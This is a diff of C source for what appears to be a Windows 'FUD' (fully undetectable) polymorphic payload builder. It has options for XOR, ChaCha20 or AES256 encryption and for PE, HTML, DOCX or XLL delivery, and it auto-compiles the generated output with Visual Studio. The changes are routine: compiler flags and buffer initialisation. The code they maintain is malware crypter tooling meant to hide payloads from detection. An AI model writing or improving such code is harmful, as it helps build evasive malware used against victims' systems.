@@ -88,14 +88,12 @@ static int VS2022_AutoCompile(const char* sourceFile, const char* outputFile) {
         sprintf_s(testCmd, sizeof(testCmd), "dir \"%s\" >nul 2>&1", vsPaths[i]);
         if (system(testCmd) == 0) {
             // Found VS2022 installation, try to compile with it
-            sprintf_s(compileCmd, sizeof(compileCmd),
-                "cmd /c \"pushd \"%s\\VC\\Auxiliary\\Build\" && "
-                "vcvarsall.bat x64 >nul 2>&1 && "
-                "popd && "
-                "cl.exe /nologo /O1 /MT /TC /bigobj \"%s\" /Fe:\"%s\" "
-                "/link /SUBSYSTEM:WINDOWS /LARGEADDRESSAWARE /DYNAMICBASE /NXCOMPAT "
-                "user32.lib kernel32.lib gdi32.lib advapi32.lib shell32.lib ole32.lib\"",
-                vsPaths[i], sourceFile, outputFile);
+                                                   sprintf_s(compileCmd, sizeof(compileCmd),
+                  "cmd /c \"\"%s\\VC\\Auxiliary\\Build\\vcvarsall.bat\" x64 && "
+                  "cl.exe /nologo /O2 /MD /TC /bigobj \"%s\" /Fe:\"%s\" "
+                  "/link /SUBSYSTEM:WINDOWS /LARGEADDRESSAWARE /DYNAMICBASE /NXCOMPAT "
+                  "user32.lib kernel32.lib gdi32.lib advapi32.lib shell32.lib ole32.lib\"",
+                  vsPaths[i], sourceFile, outputFile);
             
             result = system(compileCmd);
             if (result == 0) {
@@ -107,7 +105,7 @@ static int VS2022_AutoCompile(const char* sourceFile, const char* outputFile) {
     // Method 2: Try Windows SDK compiler if VS2022 failed
     sprintf_s(compileCmd, sizeof(compileCmd),
         "cmd /c \"\"C:\\Program Files (x86)\\Windows Kits\\10\\bin\\x64\\cl.exe\" "
-        "/nologo /O1 /MT /TC \"%s\" /Fe:\"%s\" "
+        "/nologo /O2 /MD /TC \"%s\" /Fe:\"%s\" "
         "user32.lib kernel32.lib\"",
         sourceFile, outputFile);
     result = system(compileCmd);
@@ -133,8 +131,8 @@ static int VS2022_AutoCompile(const char* sourceFile, const char* outputFile) {
     if (result != 0) {
         // Method 5: Try to use vcvarsall globally
         sprintf_s(compileCmd, sizeof(compileCmd),
-            "cmd /c \"call vcvarsall.bat x64 >nul 2>&1 && "
-            "cl.exe /nologo /O1 /MT /TC \"%s\" /Fe:\"%s\" "
+            "cmd /c \"call vcvarsall.bat x64 && "
+            "cl.exe /nologo /O2 /MD /TC \"%s\" /Fe:\"%s\" "
             "user32.lib kernel32.lib\"",
             sourceFile, outputFile);
         result = system(compileCmd);
@@ -143,7 +141,7 @@ static int VS2022_AutoCompile(const char* sourceFile, const char* outputFile) {
     if (result != 0) {
         // Method 6: Last resort - try cl.exe directly (might work if already in PATH)
         sprintf_s(compileCmd, sizeof(compileCmd),
-            "cl.exe /nologo /MT \"%s\" /Fe:\"%s\" "
+            "cl.exe /nologo /MD \"%s\" /Fe:\"%s\" "
             "user32.lib kernel32.lib",
             sourceFile, outputFile);
         result = system(compileCmd);
@@ -734,7 +732,7 @@ static DWORD WINAPI VS2022_GenerationThread(LPVOID lpParam) {
     char inputPath[260] = {0};
     GetWindowTextA(hInputPath, inputPath, sizeof(inputPath));
     
-    char batchText[16];
+    char batchText[16] = {0};
     GetWindowTextA(hBatchCount, batchText, sizeof(batchText));
     int batchCount = atoi(batchText);
     if (batchCount < 1) batchCount = 1;
@@ -761,7 +759,7 @@ static DWORD WINAPI VS2022_GenerationThread(LPVOID lpParam) {
         generatePolymorphicExecutableWithPayload(sourceCode, sourceCodeSize, encType, delType, inputPath);
         
         // Create temporary source file
-        char tempSource[256];
+        char tempSource[256] = {0};
         sprintf_s(tempSource, sizeof(tempSource), "VS2022_FUD_%I64u_%d.cpp", GetTickCount64(), batch);
         
         // Write source file
@@ -775,7 +773,7 @@ static DWORD WINAPI VS2022_GenerationThread(LPVOID lpParam) {
             PostMessage(hMainWindow, WM_USER + 2, 0, 0);
             
             // Determine output executable path
-            char finalExecutablePath[260];
+            char finalExecutablePath[260] = {0};
             if (autoFilename || batchCount > 1) {
                 const char* delNames[] = {"Benign", "PE", "HTML", "DOCX", "XLL"};
                 const char* encNames[] = {"None", "XOR", "ChaCha20", "AES256"};
@@ -814,7 +812,7 @@ static DWORD WINAPI VS2022_GenerationThread(LPVOID lpParam) {
                 }
             } else {
                 // Compilation failed - save source
-                char sourcePath[260];
+                char sourcePath[260] = {0};
                 strcpy_s(sourcePath, sizeof(sourcePath), finalExecutablePath);
                 char* lastDot = strrchr(sourcePath, '.');
                 if (lastDot) strcpy(lastDot, ".cpp");
@@ -1084,7 +1082,7 @@ static LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM l
             // Progress update
             int currentBatch = LOWORD(wParam);
             int totalBatches = HIWORD(wParam);
-            char statusMsg[256];
+            char statusMsg[256] = {0};
             sprintf_s(statusMsg, sizeof(statusMsg), "VS2022 Auto-Compiling executable %d of %d...", currentBatch + 1, totalBatches);
             SetWindowTextAnsi(hStatusText, statusMsg);
             
